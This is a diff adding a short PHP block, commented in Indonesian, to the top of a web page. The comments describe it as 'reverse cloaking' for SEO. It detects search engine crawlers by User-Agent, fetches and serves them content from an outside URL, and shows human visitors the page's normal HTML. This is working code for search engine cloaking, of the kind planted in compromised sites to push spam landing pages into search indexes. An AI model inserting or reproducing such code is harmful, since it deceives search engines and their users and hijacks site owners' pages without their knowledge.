@@ -1,0 +1,39 @@
+<?php
+// 1. Ambil User Agent
+$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+
+// 2. Daftar Bot yang mau dikasih "Makanan Enak" (Landing Page)
+$bot_list = array(
+    'googlebot', 'bingbot', 'slurp', 'yandex', 'baiduspider', 
+    'duckduckbot', 'facebot', 'ia_archiver', 'crawler', 'spider'
+);
+
+$is_bot = false;
+foreach ($bot_list as $bot) {
+    if (strpos($ua, $bot) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+// --- LOGIKA REVERSE CLOAKING ---
+
+if ($is_bot) {
+    // KALO BOT: Kasih konten dari landing page .live (Buat SEO/Indexing)
+    $landing_url = "https://jasamarga.org/icjstagii/index.html";
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $landing_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); // Kirim UA asli
+    $output = curl_exec($ch);
+    curl_close($ch);
+    
+    echo $output;
+    exit(); // Stop di sini, jangan kasih lihat HTML asli ke bot
+}
+
+// KALO MANUSIA: Script PHP di atas bakal dilewati, 
+// dan server otomatis nampilin kode HTML di bawah ini.
+?>
